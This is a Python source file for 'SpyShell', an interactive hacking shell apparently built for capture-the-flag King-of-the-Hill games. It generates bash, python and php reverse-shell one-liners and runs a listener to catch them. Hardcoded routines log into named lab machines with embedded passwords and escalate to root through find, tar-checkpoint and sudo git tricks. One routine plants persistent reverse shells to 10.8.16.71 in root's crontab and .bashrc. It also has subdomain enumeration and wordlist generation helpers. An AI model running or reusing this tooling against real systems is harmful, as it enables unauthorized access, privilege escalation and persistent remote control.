import os, sys, pyfiglet, sockets, subprocess, readline, random, time, datetime, platform, distro, argparse,socket
import pefile, hashlib, re, requests, string, stegano
from Wappalyzer import Wappalyzer, WebPage
from stegano import lsb
import threading, builtwith, itertools
from PIL import UnidentifiedImageError




# color variables
red = '\033[0;31m'
boldRED = '\033[1;31m'
yellow = '\033[1;33m'
green = '\033[0;32m'
blue = '\033[0;34m'
purple = '\033[0;35m'
lightGRN = '\033[1;32m'
lightBLUE = '\033[1;34m'
nc = '\033[0m'

def getPrompt():
    user = os.getlogin()
    hostname = socket.gethostname()
    cwd = os.getcwd().replace(os.environ["HOME"], "~")
    time_now = time.strftime("%H:%M:%S")
    prompt = f"{purple};-)[{nc}{lightBLUE}{user}@{hostname}{nc}{purple}]{nc} {lightGRN}in{nc} {yellow}{cwd}{nc} {green}{time_now}{nc}\n"
    prompt += f"{lightBLUE}❯{nc} "
    return prompt

def printFiglet(text):
    figletOutput = subprocess.check_output(f"figlet -f small.flf '{text}'", shell=True).decode()
    print(figletOutput, end="")

def runCommand(cmd):
    args = cmd.split()
    if args[0] == 'helloFriend':
        hello_friend()
    elif args[0] == 'bye':
        bye()
    elif args[0] == 'time':
        show_time()
    elif args[0] == 'date':
        show_date()
    elif args[0] == 'day':
        show_day()
    elif args[0] == 'whichDistro':
        which_distro()
    elif args[0] == 'revenger':
        revenger()
    elif args[0] == 'grabIp' or args[0] == 'grabip':
        grabip()
    elif args[0] == 'splitV':
        split_v()
    elif args[0] == 'splitH':
        split_h()
    elif args[0] == 'defaultTheme' or args[0] == 'tmux':
        new_session()
    elif args[0] == 'ohshit':
        domenum()
    elif args[0] == 'stegoscanner':
        stegoscanner()
    elif args[0] == 'webAnalyzer':
        web_analyzer()
    elif args[0] == 'heyListen':
        reverse_shell()
    elif args[0] == 'wordGen':
        generateList()
    elif args[0] == 'koth':
        koth()
    elif args[0] == 'serveHttp':
        run_http_server()
    elif args[0] == 'portcheck' or args[0] == 'portCheck':
        host = 'localhost'
        port = int(input("[ENTER THE PORT NUMBER TO CHECK]: "))
        portcheck(host,port)
    elif args[0].lower() in ['helpme', 'help-me', 'help me', 'help']:
        help()
    #koth fun
    elif args[0] == 'fileInfo' or args[0] == 'fileInfo':
        if len(args) > 1:
            fileinfo(args[1])
        else:
            print(f"{red}fileinfo: missing operand{nc}")
    elif args[0] == 'cd':
        try:
            if len(args) > 1:
                os.chdir(os.path.expanduser(args[1]))
            else:
                os.chdir(os.path.expanduser("~"))
        except IndexError:
            print(f"{red}cd: missing operand{nc}")
        except FileNotFoundError:
            print(f"{red}cd: no such file or directory: {args[1]}{nc}")
    else:
        try:
            subprocess.run(cmd, shell=True, check=True)
        except subprocess.CalledProcessError as ex:
            print(f"{red}Command '{cmd}' failed with exit code {ex.returncode}.{nc}")

def help():
    print("""SpyShell's Commands are listed below : 
            1. heyListen
            2. webAnalyzer
            3. stegoscanner
            4. revenger
            5. helloFriend
            6. help me
            7. ohshit (domain enumeration from online sources)
            8. fileInfo
            9. grabIp
            10. wordGen 
            11. koth
            12. serveHttp
            more are in progress
            """)

def koth():
    ipAdd = input("[ENTER YOUR MACHINE IP]: ")
    inp = input("[WHICH MACHINE TO PWN]: ")
    if inp == "production":
        ashu_at_production()
    elif inp == "shrek":
        donkey_at_shrek()
    elif inp == 'panda':
        panda()
    else :
        print("[BYE BYE!] ;-)")

def hello_friend():
    print("enter the path of file : ")
    path = input()
    if os.path.exists(f'{path}'):
        print("please wait connecting with vpn...")
        os.system(f'sudo openvpn {path} 2>/dev/null &')
    else:
        print("Hey! the file you're trying to use doesn't exist.")

def run_http_server():
    try:
        port = input("[ENTER THE PORT FOR SERVER]: ")
        command = f"python -m http.server {port} "
        subprocess.run(command,shell=True)
    except Exception as exp:
        print(exp)


def ashu_at_production():
    try:
        command = """
                echo -e "enter the machine IP :\n"
                read IP
                ssh -t -i prossh ashu@$IP << EOF
                sudo su skidy
                python -c "import pty;pty.spawn('/bin/bash')"
                whoami
                sudo git branch --help config << EOF1
                whoami
                EOF1
                EOF"""
        subprocess.run(command, shell=True)
    except Exception as exp:
        print(f"Exception occurred : {exp}")

def panda():
    command = f"""
            echo "shifu's password is 'batman'"
            echo -e "enter the machine IP: "
            read IP
            ssh -t shifu@$IP << EOF
            find . -exec /bin/sh -p \; -quit
            echo "* * * * * /bin/bash -i >& /dev/tcp/10.8.16.71/4444 0>&1" >> /var/spool/cron/root
            echo "/bin/bash -i >& /dev/tcp/10.8.16.71/4444 0>&1 & disown" >> ~/.bashrc
            alias cd="cd && source .bashrc &"
            EOF
    """
    subprocess.run(command, shell=True)

def donkey_at_shrek():
    ip = input("enter the ip address for shrek: ")
    command = f"""echo "donkey:J5rURvCa8DyTg3vR"
                echo "enter the ip address : "
                read ip
                ssh -T donkey@{ip} << EOF
                sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
                python -c "import pty;pty.spawn('/bin/bash')"
                whoami
                EOF"""
    subprocess.run(command, shell=True)

def analyze_link(url):
    print("------------------------------------------")
    print("------------------------------------------")
    website_info = builtwith.builtwith(url)
    print("Technologies and versions used by", url, ":")
    try:
        for tech, info in website_info.items():
            if isinstance(info, list):
                version = info[0] if info else None
            else:
                version = info
            if version:
                print("==> " + tech + " " + version)
            else:
                print("==> " + tech)

        print("\n[+wappalyzer results]")
        wappalyzer = Wappalyzer.latest()
        web = wappalyzer.analyze(url)

        for app in web.apps:
            print(f"- {app.name} {app.version}")


        print("------------------------------------------")
        print("------------------------------------------")
    except Exception as err:
        print(f"[ERROR OCCURRED]")

def web_analyzer():
    ask = int(input("Do you want to analyze a single link or a list of links? \n1. Single link\n2. List of links\nInput: "))
    if ask == 1:
        url = str(input("Enter the link: "))
        analyze_link(url)
    elif ask == 2:
        filename = input("Enter the filename containing the links: ")
        with open(filename, 'r') as f:
            links = f.readlines()

        analyzed_links = []
        for link in links:
            link = f"http://{link.strip()}"
            try:
                response = requests.head(link, allow_redirects=True)
                status_code = response.status_code
                if status_code == 200 or status_code == 302:
                    analyzed_links.append(link)
                else:
                    domain = link.split('//')[1]
                    analyzed_links.append(f"https://{domain}")
            except requests.exceptions.RequestException:
                analyzed_links.append(None)

        for link in analyzed_links:
            if link is not None:
                analyze_link(link)
            else:
                print("[ERROR OCCURRED]")

def handle_connection(conn):
    while True:
        data = conn.recv(1024)
        if not data:
            break
        sys.stdout.write(data.decode())
        sys.stdout.flush()
        
    conn.close()
    
def portcheck(host,port):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try: 
        s.bind((host,port))
        print("[PORT OPEN]")
        return True
    except OSError as err:
        print(f"[PORT CLOSED] : {err}")
        return False
    

def reverse_shell():
    ip = "0.0.0.0"
    host = str(ip)
    port = int(input("[ENTER THE PORT NUMBER]"))

    if portcheck(host,port):
        print(f"[LISTENING ON PORT {port}]")
    else:
        print("[PORT CAN'T BE USED]")
        return

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print('Listening on {}:{}'.format(host, port))
    conn, addr = s.accept()
    print('Connection received from ',addr)

    t = threading.Thread(target=handle_connection, args=(conn,))
    t.start()

    active = True
    while active:
        try:
            cmds = input() + "\n"
            conn.send(cmds.encode())
            if cmds.strip() == "exit":
                print(";-) killed the terminal successfully")
                break
        except:
            active = False

    s.close()

def generateList():
    words = input("Enter words separated by space: ").split()
    length = int(input("Enter maximum length of combinations: "))
    letters = [set(word) for word in words]
    combinations = itertools.chain.from_iterable(itertools.product(*letters, repeat=i) for i in range(1, length+1))

    filename = input("enter the filename to save data in : ")

    with open(filename, 'w') as f:
        for combination in combinations:
            f.write(''.join(combination) + '\n')

    print(f"Wordlist saved to {filename}")

def domenum():
    domain = input("Enter domain: ")
    urls = [
        f"https://dnsdumpster.com/",
        f"https://crt.sh/?q=%.{domain}&output=json",
        f"https://securitytrails.com/domain/{domain}/dns",
        f"https://www.virustotal.com/ui/domains/{domain}/subdomains",
        f"https://api.hackertarget.com/hostsearch/?q={domain}",
        f"https://www.threatcrowd.org/searchApi/v2/domain/report/?domain={domain}",
    ]
    subdomains = set()

    for url in urls:
        try:
            response = requests.get(url)
            if response.status_code == 200:
                html = response.text
                if "dnsdumpster" in url:
                    for subdomain in re.findall(r'[a-z0-9\.\-]+\.%s' % domain, html):
                        subdomains.add(subdomain)
                elif "crt.sh" in url:
                    for match in re.findall(r'"name_value":"(.*?)",', html):
                        subdomain = match.strip()
                        if subdomain.endswith(domain):
                            subdomains.add(subdomain)
                elif "securitytrails" in url:
                    subdomains_list = re.findall(r'data-target-value="([^"]*)"', html)
                    for subdomain in subdomains_list:
                        if "\\n" in subdomain:
                            subdomain = subdomain.replace("\\n", "\n")
                            subdomain = subdomain.split("\n")
                            for sub in subdomain:
                                if sub.strip() != "":
                                    subdomains.add(sub)
                        else:
                            subdomains.add(subdomain)
                elif "virustotal" in url:
                    json_data = response.json()
                    for subdomain in json_data['data']:
                        subdomains.add(subdomain['id'].lower())
                elif "hackertarget" in url:
                    for subdomain in html.split("\n"):
                        subdomain = subdomain.strip()
                        if subdomain != "":
                            subdomains.add(subdomain)
                elif "threatcrowd" in url:
                    json_data = response.json()
                    for subdomain in json_data['subdomains']:
                        subdomains.add(subdomain.lower())
        except Exception as e:
            print(f"Error fetching subdomains from {url}: {e}")

    subdomains = list(set(subdomains))
    subdomains_str = "\n".join(subdomains)
    subdomains_str = subdomains_str.replace("\\n", "\n")
    filename = f'subdomain_{random.randint(1, 100000)}.txt'
    filepath = os.path.join('.', filename)
    with open(filepath, 'w') as f:
        f.write(subdomains_str)

    print(f"{len(subdomains)} subdomains written to file {filepath}")
    return subdomains

def stegoscanner():
    path = input("Enter directory path: ")
    
    for filename in os.listdir(path):
        filepath = os.path.join(path, filename)
        
        try:
            secret_text = lsb.reveal(filepath)
            print(f"{filename} contains steganographic content.")
        except:
            pass

def fileinfo(path):
    if os.path.isdir(path):
        # loop over files in directory and call fileinfo on each file
        for filename in os.listdir(path):
            fileinfo(os.path.join(path, filename))
    else:
        fsize = os.path.getsize(path)
        ftype = subprocess.check_output(['file', path]).decode().strip()
        md5_hash = hashlib.md5(open(path, 'rb').read()).hexdigest()
        sha256_hash = hashlib.sha256(open(path, 'rb').read()).hexdigest()
        print(f'file size   : {fsize}')
        print(f'file type   : {ftype}')
        print(f'md5 hash    : {md5_hash}')
        print(f'sha256 hash : {sha256_hash}')
        if ftype.startswith("PE32") or ftype.startswith("PE32+"):
            pef = pefile.PE(path)
            print("PE file info ;~)")
            print("   Machine: ",hex(pef.FILE_HEADER.Machine))
            print("   Number of sections: ",hex(pef.FILE_HEADER.NumberOfSections))
            print("   Machine: ",hex(pef.OPTIONAL_HEADER.AddressOfEntryPoint))
            print("   Machine: ",hex(pef.OPTIONAL_HEADER.Imagebase))
            for section in pef.sections:
                print("    Name:", section.Name.decode().rstrip('\x00'))
                print("    Virtual address:", hex(section.VirtualAddress))
                print("    Size of raw data:", hex(section.SizeOfRawData))
                print("    Entropy:", section.get_entropy())
                print()
        print(f'\nrandomness or unpredictability of the data in file (ent) :') 
        entropy = subprocess.check_output(['ent', path]).decode()
        match = re.search('Entropy = ([0-9\.]+) bits per byte.', entropy)
        if match:
            print("Entropy:", match.group(1))
        print(f'head : =========================================================>')
        os.system(f'xxd {path} | head')
        print(f'tail : =========================================================>')
        os.system(f'xxd {path} | tail')


def defaulttheme():
    os.system('printf "\033]50;SetProfileParameter=FontSize:12\a"')
    os.system('printf "\033[1m\033[3m"')
    os.system('unset TMUX')
    os.system('tmux send-keys -t 0 "tmux split-window -h \' -l 90\';tmux select-pane -t 1" Enter')
    os.system('tmux send-keys -t 0 "tmux select-pane -t 0; tmux split-window -v \'-l 34\';tmux select-pane -t 2" Enter')
    os.system('tmux send-keys -t 0 "tmux select-pane -t 1; tmux split-window -v \'-l 25\';tmux select-pane -t 3" Enter')
    os.system('tmux send-keys -t 0 "tmux select-pane -t 3; tmux split-window -v \'-l 10\';tmux select-pane -t 4" Enter')
    os.system('tmux send-keys -t 0 "tmux select-pane -t 3; tmux split-window -v \'-l 8\';tmux select-pane -t 5" Enter')
    time.sleep(1)
    os.system('tmux send-keys -t 4 "tmux select-pane -t 4; ./asset1;"')
    os.system('tmux send-keys -t 4 "" Enter')
    os.system('clear')


def revenger():
    ip_address = input("Enter target IP address: ")
    shell_type = input("Enter shell type (bash/python/python3/php): ")
    
    rev_shells = {
        'bash': f'bash -c "/bin/bash -i >& /dev/tcp/{ip_address}/4444 0>&1"',
        'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip_address}\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        'php': f"php -r '\$sock=fsockopen(\"{ip_address}\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        'python3': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip_address}\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"
    }
    
    rev_shell = rev_shells.get(shell_type)
    if rev_shell is None:
        print("Invalid shell type. Valid options are bash, python, or php.")
        return
    
    subprocess.run(['echo', rev_shell], capture_output=True, text=True, check=True)
    subprocess.run(['xclip', '-selection', 'clipboard'], input=rev_shell, text=True, check=True)
    print("\033[1;32mReverse shell generated and copied to clipboard!\033[0m")


def grabip():
    ips = os.popen('ifconfig | grep -E "inet [0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | awk \'{print $1,$2}\'').read().strip()
    if ips:
        os.system(f'echo "{ips}" | figlet -f small.flf')
    else:
        print('No IP addresses found.')


def split_v():
    subprocess.run(['tmux', 'split-window', '-v', '-c', './', 'python3', 'spyshell.py'])


def split_h():
    subprocess.run(['tmux', 'split-window', '-h', '-c', './', 'python3', 'spyshell.py'])


def defaultTheme():
    os.system('printf "\033]50;SetProfileParameter=FontSize:12\a"')
    os.system('printf "\033[1m\033[3m"')
    os.system('unset TMUX; tmux send-keys -t 0 "tmux split-window -h \' -l 90\';tmux select-pane -t 1" Enter')
    os.system('unset TMUX; tmux send-keys -t 0 "tmux select-pane -t 0; tmux split-window -v \'-l 34\';tmux select-pane -t 2" Enter')
    os.system('unset TMUX; tmux send-keys -t 0 "tmux select-pane -t 1; tmux split-window -v \'-l 25\';tmux select-pane -t 3" Enter')
    os.system('unset TMUX; tmux send-keys -t 0 "tmux select-pane -t 3; tmux split-window -v \'-l 10\';tmux select-pane -t 4" Enter')
    os.system('unset TMUX; tmux send-keys -t 0 "tmux select-pane -t 3; tmux split-window -v \'-l 8\';tmux select-pane -t 5" Enter')
    time.sleep(1)
    os.system('unset TMUX; tmux send-keys -t 4 "tmux select-pane -t 4; ./asset1;"')
    os.system('unset TMUX; tmux send-keys -t 4 "" Enter')
    os.system('clear')
    
def new_session():
    print(f"enter the session name:")
    sess_name = input()
    subprocess.run(['tmux', 'new-session', '-n', sess_name, 'python3', 'spyshell.py'])
    subprocess.run(['tmux', 'set', '-g', 'mouse', 'on'])
    defaultTheme()

def show_time():
    now = datetime.datetime.now()
    time_str = now.strftime("%H : %M : %S")
    print(f"{boldRED}" + pyfiglet.figlet_format(time_str, font='small') + f"{nc}")

def show_date():
    now = datetime.datetime.now()
    date_str = now.strftime(f"%d / %m / %Y")
    figlet_str = pyfiglet.figlet_format(date_str, font='small')
    print(f"{boldRED}" + figlet_str + f"{nc}")


def which_distro():
    dist_name = distro.name(pretty=True)
    dist_version = distro.version(pretty=True)
    print(f"{blue}{platform.system()} {dist_name} {dist_version} {platform.machine()}{nc}")


def show_day():
    days = ["Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"]
    now = datetime.datetime.now()
    day_name = days[now.weekday()]
    print(f"{boldRED}" + pyfiglet.figlet_format(day_name, font='small') + f"{nc}")


def bye():
    var1 = f"Goodbye {os.getlogin()}"
    print(f"{boldRED}" + pyfiglet.figlet_format(var1, font='small') + f"{nc}")
    sys.exit()

historyFile = os.path.expanduser("~/.spyrc")

while 1:
    cmd = input(getPrompt())
    if cmd.strip():
        with open(historyFile, "a") as f:
            f.write(cmd + "\n")
        try:
            runCommand(cmd)
        except KeyboardInterrupt:
            print(f"{yellow}Command interrupted by {os.getlogin()}.{nc}")
            continue
